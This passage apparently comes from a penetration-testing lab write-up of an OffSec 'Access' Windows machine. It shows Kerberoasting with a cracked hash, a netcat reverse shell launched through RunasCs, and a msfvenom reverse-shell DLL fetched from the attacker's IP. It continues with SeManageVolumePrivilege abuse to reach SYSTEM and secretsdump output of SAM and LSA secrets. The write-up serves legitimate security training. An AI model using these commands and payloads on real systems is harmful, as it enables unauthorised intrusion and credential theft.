+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$71434a05850620ce38e04360d6e8dd39$519295bd4f330f984a047ed0fbfa22591b740d8210808cb75f79b60fda3e3ba63d873e9279025e57d455ef7b904650c9c016a58c5e8a9e3680216978557f658ad4f72cf7afb8988e54ef9649273f74cac7b2ce5b962220e7ee702abf419cd732c0af6eed7f8277de4b1c76feca15a094e7b9380c91ab0f01f2cef917d9bb149fdd818c78001674940f17fb0ee22f5a021759621b7de867d4193ed4f5b3df077eeefb04b932b6207f0465d6bfd36537362572ab752f40b237e035bee291d8af57ad7c7ff2ad53b9bcf43f5c80e34e16ed74e4d2932b8be3ea16800d1336802a7286130b826f5cb81edd26b4f0899573a1a510d121e85576de169eab314baa4cc7ac28682541b43f144380b5c34a52225ea3d925b1879500915f16db0be4b91a832f88e59a5bb499f19d2943da380711599b93baa51aed091f0012e4f2d3478cff56f2a1cb60b56d3a10e8fe22334fd407a052e515abdea52a71c325f0f1c8fb2c491eac0eb91aca4af83c3c9f9b4b9e445714c6648d4dc3490917356fafd7b7fd3b0b9e31455b756564493a3ff41c0dc633a55bffc2a2f1c60c51ea1ce2bf4c021d528b843f47a975a45562ff18655a45739d28a65170706a008c36506d62161de7abb7950a4db138955f50f4cdc9f6efd40c25000c340f197a6ee0c3c0cab650d9e1700a38222e2cfaf1f244fc37e1b21327cc796000bf8426538c0198ff412829e7e393cf76055c091ad163f39af5eec42ea2632865873e2995db8d38128a80d16a793c608c20336e76634d8e648174323c6df17e87bbc96bf80cc97c3946937cb626aacd2e5fdd3912b239460ab6fd4a6ee1081f2449d888aef7d62a304bfb925d6bbb87eef10e91e78b467eff1e8ade68a7d1f3eec8c3f2498088d6980bbc589c9ff270907a1aed09aaae13417bd334e2fe675fe713abed1c62dbc6ebb6e31c3d17353a80830c5491b881baac8abd16d65506e0e2d8f5f097972d1d533bed8c6a3b249884c056384b49d76bb16b04ceb84578681ba7196327df4d013412df4ec527bc6f02045edc148c7bcfffdbe7481e6edab6cd35d765bdc7ad716e1b22a6f963c081c42f5547719640e0ce433bfddb6bb478983a4f4bf4c1dfe59c5ed1a0c91868e0830e2868463e22bba5ae128efc6f96da0ac69b3645a9ca735948a08cd492f161cefa5cc479e160fb7ad9fbd995bbd5eb3d34aaa3bf45ce7ff6257d5f4535a70cd8913d8ba1e10831128c1faddd435e4215ca4113797f75b7cd1922a532a7ef6223e3114b9ee3d77333c9592ee99dd25dc4c2933497cc31ab2870de28504e8e71399bc4423909cac8a45c08fbe9276a77625301ffaf04469a9aabc8862e898359fe20f5082fb5ade230833271db8249311a0873b5f67f3e74513f2c20078121385f7e8298797ad16b79f85448e643d6bb9cc960f49a60533ea9de16d05770f8afb73e5f24b224cf3c382be13a09a0a01742952e1179583a6882fb2fbf5d4e67dbb01c57d894ad1da8a005970e50ba7e5b40df0997518322b3aa1ccadad94c5d87099ad6ef5d533661ced18c660cf5e62cc30db79ddf7446f40d6977b779dfd414a4c7477265b1dc57e6c88c8d03:trustno1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)</code></pre></div>
+<p>The credentials seem to work successfully:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ nxc smb 192.168.229.187 -u svc_mssql -p trustno1          
+SMB         192.168.229.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.229.187 445    SERVER           [+] access.offsec\svc_mssql:trustno1</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ nxc<span class="hljs-built_in"> smb </span>192.168.229.187 -u svc_mssql -p trustno1          <span class="hljs-built_in">
+SMB </span>        192.168.229.187 445   <span class="hljs-built_in"> SERVER </span>          [*] Windows 10 /<span class="hljs-built_in"> Server </span>2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) <span class="hljs-built_in">
+SMB </span>        192.168.229.187 445   <span class="hljs-built_in"> SERVER </span>          [+] access.offsec\svc_mssql:trustno1</code></pre></div>
+<p>Since the <code class="inline-code">svc_mssql</code> account has limited privileges to access the machine, transfer <code class="inline-code">RunasCs.exe</code> and obtain a reverse shell connection:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Temp&gt; .\RunasCs.exe svc_mssql trustno1 &quot;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&quot; -t 0
+[*] Warning: The logon for user &apos;svc_mssql&apos; is limited. Use the flag combination --bypass-uac and --logon-type &apos;8&apos; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-460c0$\Default
+[+] Async process &apos;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&apos; with pid 3616 created in background.
+PS C:\Temp&gt; 
+</pre><pre class="hljs"><code>PS C:<span class="hljs-string">\Temp&gt;</span> .<span class="hljs-string">\RunasCs.exe</span> svc_mssql trustno1 <span class="hljs-string">&quot;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&quot;</span> -t <span class="hljs-number">0</span>
+[*] Warning: The logon <span class="hljs-keyword">for</span> user <span class="hljs-string">&apos;svc_mssql&apos;</span> <span class="hljs-keyword">is</span> limited. Use the flag combination --bypass-uac <span class="hljs-keyword">and</span> --logon-type <span class="hljs-string">&apos;8&apos;</span> <span class="hljs-keyword">to</span> obtain a more privileged token.
+
+[+] Running <span class="hljs-keyword">in</span> session <span class="hljs-number">0</span> <span class="hljs-keyword">with</span> process <span class="hljs-keyword">function</span> CreateProcessWithLogonW()
+[+] Using Station<span class="hljs-string">\Desktop:</span> Service-<span class="hljs-number">0x0</span>-<span class="hljs-number">460c</span>0$<span class="hljs-string">\Default</span>
+[+] Async process <span class="hljs-string">&apos;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&apos;</span> <span class="hljs-keyword">with</span> pid <span class="hljs-number">3616</span> created <span class="hljs-keyword">in</span> background.
+PS C:<span class="hljs-string">\Temp&gt;</span> 
+</code></pre></div>
+<p>Now I have a shell as <code class="inline-code">svc_mssql</code> on port 443:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ nc -lvnp 443                                   
+listening on [any] 443 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.229.187] 50495
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+access\svc_mssql
+
+C:\Windows\system32&gt;
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Access]</span>
+&boxur;&boxh;$ nc -lvnp <span class="hljs-number">443</span>                                   
+listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">443</span> ...
+connect to <span class="hljs-selector-attr">[192.168.45.197]</span> from (UNKNOWN) <span class="hljs-selector-attr">[192.168.229.187]</span> <span class="hljs-number">50495</span>
+Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.17763.2746]</span>
+(c) <span class="hljs-number">2018</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+access\svc_mssql
+
+C:\Windows\system32&gt;
+</code></pre></div>
+<p>We can obtain the first flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Users\svc_mssql\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+
+ Directory of C:\Users\svc_mssql\Desktop
+
+04/08/2022  01:40 AM    &lt;DIR&gt;          .
+04/08/2022  01:40 AM    &lt;DIR&gt;          ..
+01/25/2026  01:02 AM                34 local.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  11,325,616,128 bytes free
+
+C:\Users\svc_mssql\Desktop&gt;more local.txt
+more local.txt
+b0a2b9ceead170cd3d5640add01ec3d5</pre><pre class="hljs"><code><span class="hljs-attribute">C</span>:\Users\svc_mssql\Desktop&gt;dir
+<span class="hljs-attribute">dir</span>
+ <span class="hljs-attribute">Volume</span> in drive C has no label.
+ <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">5</span>C30-DCD7
+
+ <span class="hljs-attribute">Directory</span> of C:\Users\svc_mssql\Desktop
+
+<span class="hljs-attribute">04</span>/<span class="hljs-number">08</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">40</span> AM    &lt;DIR&gt;          .
+<span class="hljs-attribute">04</span>/<span class="hljs-number">08</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">40</span> AM    &lt;DIR&gt;          ..
+<span class="hljs-attribute">01</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2026</span>  <span class="hljs-number">01</span>:<span class="hljs-number">02</span> AM                <span class="hljs-number">34</span> local.txt
+               <span class="hljs-attribute">1</span> File(s)             <span class="hljs-number">34</span> bytes
+               <span class="hljs-attribute">2</span> Dir(s)  <span class="hljs-number">11</span>,<span class="hljs-number">325</span>,<span class="hljs-number">616</span>,<span class="hljs-number">128</span> bytes free
+
+<span class="hljs-attribute">C</span>:\Users\svc_mssql\Desktop&gt;more local.txt
+<span class="hljs-attribute">more</span> local.txt
+<span class="hljs-attribute">b0a2b9ceead170cd3d5640add01ec3d5</span></code></pre></div>
+<p>Our current user has <code class="inline-code">SeManageVolumePrivilege</code>. This can be abused to give full permissions to all users over <code class="inline-code">C:\</code> and place a malicious DLL called <code class="inline-code">Printconfig.dll</code> over at <code class="inline-code">C:\Windows\System32\spool\drivers\x64\3</code>. More about this attack are explained <a data-from-md="" title="https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege" href="https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege">here</a>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+</pre><pre class="hljs"><code>C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+<span class="hljs-section">PRIVILEGES INFORMATION
+----------------------</span>
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+</code></pre></div>
+<p>Generate the <code class="inline-code">Printconfig.dll</code> payload first:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.197 LPORT=445 -f dll -o Printconfig.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: Printconfig.dll</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.45.197 <span class="hljs-attribute">LPORT</span>=445 -f dll -o Printconfig.dll
+[-] <span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload
+<span class="hljs-literal">No</span> encoder specified, outputting<span class="hljs-built_in"> raw </span>payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: Printconfig.dll</code></pre></div>
+<p>Download, transfer, and run the <code class="inline-code">SeManageVolumeExploit.exe</code> from <a data-from-md="" title="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public" href="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public">here</a> over at the target machine as the <code class="inline-code">svc_mssql</code> user:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Temp&gt;.\SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe
+Entries changed: 4
+DONE </pre><pre class="hljs"><code>C:<span class="hljs-string">\Temp&gt;.\SeManageVolumeExploit.exe</span>
+.<span class="hljs-string">\SeManageVolumeExploit.exe</span>
+Entries changed: <span class="hljs-number">4</span>
+DONE </code></pre></div>
+<p>Then download the <code class="inline-code">PrintConfig.dll</code> over at the <code class="inline-code">C:\Windows\System32\spool\drivers\x64\3\</code> directory:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Temp&gt; iwr -uri http://192.168.45.197/Printconfig.dll -outfile C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+PS C:\Temp&gt; 
+PS C:\Temp&gt; dir C:\Windows\System32\spool\drivers\x64\3\
+
+
+    Directory: C:\Windows\System32\spool\drivers\x64\3
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/15/2018   2:08 AM                en-US                                                                 
+-a----        9/15/2018  12:11 AM          14088 LOCALE.GPD                                                            
+-a----        9/15/2018  12:11 AM             73 MSXPSINC.GPD                                                          
+-a----        9/15/2018  12:11 AM             72 MSXPSINC.PPD                                                          
+-a----         4/8/2022  12:18 AM         869888 MXDWDRV.DLL                                                           
+-a----        9/15/2018  12:11 AM          25489 P6DISP.GPD                                                            
+-a----        9/15/2018  12:11 AM           3293 P6FONT.GPD                                                            
+-a----        9/15/2018  12:11 AM         288256 PCL4RES.DLL                                                           
+-a----        9/15/2018  12:11 AM        1025536 PCL5ERES.DLL                                                          
+-a----        9/15/2018  12:11 AM        1025024 PCL5URES.DLL                                                          
+-a----        9/15/2018  12:11 AM         204288 PCLXL.DLL                                                             
+-a----        9/15/2018  12:11 AM          10375 PCLXL.GPD                                                             
+-a----        9/15/2018  12:11 AM           1156 PJL.GPD                                                               
+-a----         4/8/2022  12:18 AM          23040 PJLMON.DLL                                                            
+-a----        1/25/2026   2:16 AM           9216 PrintConfig.dll</pre><pre class="hljs"><code>PS C:\Temp&gt; iwr -uri http://192.168.45.197/Printconfig.dll -outfile C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+PS C:\Temp&gt; 
+PS C:\Temp&gt; dir C:\Windows\System32\spool\drivers\x64\3\
+
+
+    Directory: C:\Windows\System32\spool\drivers\x64\3
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/15/2018   2:08 AM                en-US                                                                 
+-a----        9/15/2018  12:11 AM          14088 LOCALE.GPD                                                            
+-a----        9/15/2018  12:11 AM             73 MSXPSINC.GPD                                                          
+-a----        9/15/2018  12:11 AM             72 MSXPSINC.PPD                                                          
+-a----         4/8/2022  12:18 AM         869888 MXDWDRV.DLL                                                           
+-a----        9/15/2018  12:11 AM          25489 P6DISP.GPD                                                            
+-a----        9/15/2018  12:11 AM           3293 P6FONT.GPD                                                            
+-a----        9/15/2018  12:11 AM         288256 PCL4RES.DLL                                                           
+-a----        9/15/2018  12:11 AM        1025536 PCL5ERES.DLL                                                          
+-a----        9/15/2018  12:11 AM        1025024 PCL5URES.DLL                                                          
+-a----        9/15/2018  12:11 AM         204288 PCLXL.DLL                                                             
+-a----        9/15/2018  12:11 AM          10375 PCLXL.GPD                                                             
+-a----        9/15/2018  12:11 AM           1156 PJL.GPD                                                               
+-a----         4/8/2022  12:18 AM          23040 PJLMON.DLL                                                            
+-a----        1/25/2026   2:16 AM           9216 PrintConfig.dll</code></pre></div>
+<p>Stand up a listener on port 445. Open a PowerShell session and initiate the PrintNotify object to load the malicious DLL:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Temp&gt;powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Temp&gt; $type = [Type]::GetTypeFromCLSID(&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;)
+$type = [Type]::GetTypeFromCLSID(&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;)
+PS C:\Temp&gt; $object = [Activator]::CreateInstance($type)
+$object = [Activator]::CreateInstance($type)
+Exception calling &quot;CreateInstance&quot; with &quot;1&quot; argument(s): &quot;Retrieving the COM class factory for component with CLSID 
+{854A20FB-2D44-457D-992F-EF13785D2B51} failed due to the following error: 80080005 Server execution failed (Exception 
+from HRESULT: 0x80080005 (CO_E_SERVER_EXEC_FAILURE)).&quot;
+At line:1 char:1
++ $object = [Activator]::CreateInstance($type)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : COMException
+ 
+PS C:\Temp&gt; </pre><pre class="hljs"><code>C:\Temp&gt;powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. <span class="hljs-keyword">All</span> rights reserved.
+
+PS C:\Temp&gt; $<span class="hljs-keyword">type</span> <span class="hljs-type">= </span>[<span class="hljs-keyword">Type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;</span>)
+$<span class="hljs-keyword">type</span> <span class="hljs-type">= </span>[<span class="hljs-keyword">Type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;</span>)
+PS C:\Temp&gt; $object = [Activator]::CreateInstance($<span class="hljs-keyword">type</span>)
+$object = [Activator]::CreateInstance($<span class="hljs-keyword">type</span>)
+<span class="hljs-keyword">Exception</span> calling <span class="hljs-string">&quot;CreateInstance&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;1&quot;</span> argument(s): <span class="hljs-string">&quot;Retrieving the COM class factory for component with CLSID 
+{854A20FB-2D44-457D-992F-EF13785D2B51} failed due to the following error: 80080005 Server execution failed (Exception 
+from HRESULT: 0x80080005 (CO_E_SERVER_EXEC_FAILURE)).&quot;</span>
+<span class="hljs-keyword">At</span> line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span>
++ $object = [Activator]::CreateInstance($<span class="hljs-keyword">type</span>)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : <span class="hljs-type">COMException</span>
+ 
+PS C:\Temp&gt; </code></pre></div>
+<p>Now we will obtain a SYSTEM level shell on port 445:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ nc -lvnp 445 
+listening on [any] 445 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.229.187] 50584
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Windows\system32&gt;whoami 
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ nc -lvnp 445 
+listening on [any] 445 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.229.187] 50584
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Windows\system32&gt;whoami 
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;</code></pre></div>
+<p>Now we can transfer the three hives to the target machine and extract the credentials:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo impacket-secretsdump -security security.save -sam sam.save -system system.save local
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:0fffdd83370304fec455ff4f7cc839cc2050ab890faf34b5e9d71767f5344bef07555522abbfe48884b1f2fb4aec754ff1771cb8c0a21b02085fc3128ee8cd38987234c7ea73994ba56e48e073b7227be1dd07c677552fbe4ce19d8b4c3e549469954cf2138e961b74de161c52f89551994daba4adf218020830920255047540e5c3322489270375c970a3d2810b380923ff37e69d7b98ec20955fb59730e80d87664315f212868ca26f22aeb2bfbeecb3c0f3128e2c594ca457ee8365a4f942ae8804c40be21e5697c379c1ef6a647d9a17cc107f30b741cfbd82c28a04492d9c4f58e09a8c31d5fb765c7fb53fa79e
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3df657e4617398e4ab73e41c6183f8ac3d608523
+dpapi_userkey:0xc69b79bdce1e77b22043bbb5bd336c39d3965012
+[*] NL$KM 
+ 0000   4A E2 C6 53 5D 77 02 C9  AE A9 48 23 7C 5B 46 39   J..S]w....H#|[F9
+ 0010   4A 56 02 3B CC 38 B8 C0  92 DD 41 2C 72 F2 63 46   JV.;.8....A,r.cF
+ 0020   71 36 1B E3 D2 BA E7 AC  8C BD E9 D5 55 36 C0 07   q6..........U6..
+ 0030   99 5A 11 4A 24 E4 42 E3  4C 12 3F F5 1B D7 D5 8C   .Z.J$.B.L.?.....
+NL$KM:4ae2c6535d7702c9aea948237c5b46394a56023bcc38b8c092dd412c72f2634671361be3d2bae7ac8cbde9d55536c007995a114a24e442e34c123ff51bd7d58c
+[*] _SC_ApacheHTTPServer 
+(Unknown User):ServiceApache!!
+[*] Cleaning up...</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo impacket-secretsdump -security security.save -sam sam.save -system system.save local
+[sudo] password for kali: 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:0fffdd83370304fec455ff4f7cc839cc2050ab890faf34b5e9d71767f5344bef07555522abbfe48884b1f2fb4aec754ff1771cb8c0a21b02085fc3128ee8cd38987234c7ea73994ba56e48e073b7227be1dd07c677552fbe4ce19d8b4c3e549469954cf2138e961b74de161c52f89551994daba4adf218020830920255047540e5c3322489270375c970a3d2810b380923ff37e69d7b98ec20955fb59730e80d87664315f212868ca26f22aeb2bfbeecb3c0f3128e2c594ca457ee8365a4f942ae8804c40be21e5697c379c1ef6a647d9a17cc107f30b741cfbd82c28a04492d9c4f58e09a8c31d5fb765c7fb53fa79e
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3df657e4617398e4ab73e41c6183f8ac3d608523
+dpapi_userkey:0xc69b79bdce1e77b22043bbb5bd336c39d3965012
+[*] NL$KM 
+ 0000   4A E2 C6 53 5D 77 02 C9  AE A9 48 23 7C 5B 46 39   J..S]w....H#|[F9
+ 0010   4A 56 02 3B CC 38 B8 C0  92 DD 41 2C 72 F2 63 46   JV.;.8....A,r.cF
